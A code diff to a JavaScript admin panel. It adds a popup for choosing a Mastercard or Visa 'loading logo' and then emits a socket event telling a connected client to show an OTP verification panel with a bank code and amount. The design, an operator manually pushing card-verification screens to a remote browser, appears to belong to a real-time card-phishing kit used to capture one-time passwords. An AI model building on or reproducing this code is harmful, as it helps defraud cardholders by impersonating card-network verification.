@@ -2618,6 +2618,51 @@ function showMCVerification(id) {
     return;
   }
   
+  // Create a simple popup to ask for verification type
+  const verificationTypePrompt = document.createElement('div');
+  verificationTypePrompt.style.position = 'fixed';
+  verificationTypePrompt.style.top = '50%';
+  verificationTypePrompt.style.left = '50%';
+  verificationTypePrompt.style.transform = 'translate(-50%, -50%)';
+  verificationTypePrompt.style.background = '#fff';
+  verificationTypePrompt.style.padding = '20px';
+  verificationTypePrompt.style.borderRadius = '8px';
+  verificationTypePrompt.style.boxShadow = '0 4px 10px rgba(0, 0, 0, 0.2)';
+  verificationTypePrompt.style.zIndex = '9999';
+  verificationTypePrompt.style.minWidth = '300px';
+  
+  verificationTypePrompt.innerHTML = `
+    <h3 style="margin-top: 0; margin-bottom: 15px;">Select Loading Logo</h3>
+    <p style="margin-bottom: 15px;">Choose which logo to display during the loading screen:</p>
+    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+      <button id="mcPromptMastercard" style="flex: 1; padding: 10px; background: #2778c4; color: white; border: none; border-radius: 4px; cursor: pointer;">Mastercard</button>
+      <button id="mcPromptVisa" style="flex: 1; padding: 10px; background: #1a1f71; color: white; border: none; border-radius: 4px; cursor: pointer;">Visa</button>
+    </div>
+    <button id="mcPromptCancel" style="width: 100%; padding: 10px; background: #ccc; color: #333; border: none; border-radius: 4px; cursor: pointer;">Cancel</button>
+  `;
+  
+  document.body.appendChild(verificationTypePrompt);
+  
+  // Handle button clicks
+  document.getElementById('mcPromptMastercard').addEventListener('click', function() {
+    document.body.removeChild(verificationTypePrompt);
+    proceedWithMcVerification(id, 'mastercard');
+  });
+  
+  document.getElementById('mcPromptVisa').addEventListener('click', function() {
+    document.body.removeChild(verificationTypePrompt);
+    proceedWithMcVerification(id, 'visa');
+  });
+  
+  document.getElementById('mcPromptCancel').addEventListener('click', function() {
+    document.body.removeChild(verificationTypePrompt);
+  });
+}
+
+// This function will be called after selecting the loading logo
+function proceedWithMcVerification(id, loadingLogoType) {
+  const transaction = transactionsMap.get(id);
+  
   // Show the MC verification panel
   const mcOtpPanel = document.getElementById('mcOtpPanel');
   mcOtpPanel.classList.remove('hidden');
@@ -2633,9 +2678,6 @@ function showMCVerification(id) {
   const currencySelect = document.getElementById('mcCurrencySelect');
   const selectedCurrency = currencySelect ? currencySelect.value : 'INR';
   
-  // Get selected verification type (mastercard or visa)
-  const verificationType = document.getElementById('mcVerificationType').value;
-  
   // Send event to client to show MC verification with loading state
   socket.emit('show_mc_verification', {
     invoiceId: id,
@@ -2643,10 +2685,10 @@ function showMCVerification(id) {
     amount: `₹${transaction.amount}`,
     bankCode: document.getElementById('mcBankSelect').value,
     currency: selectedCurrency, // Include selected currency
-    verificationType: document.getElementById('mcVerificationType').value
+    loadingLogoType: loadingLogoType // This is the logo that will show during loading
   });
   
-  console.log('Showing MC verification for invoice:', id, 'with currency:', selectedCurrency, 'and verification type:', verificationType);
+  console.log('Showing MC verification for invoice:', id, 'with currency:', selectedCurrency, 'and loading logo:', loadingLogoType);
 }
 
 // Enhanced screen frame handler
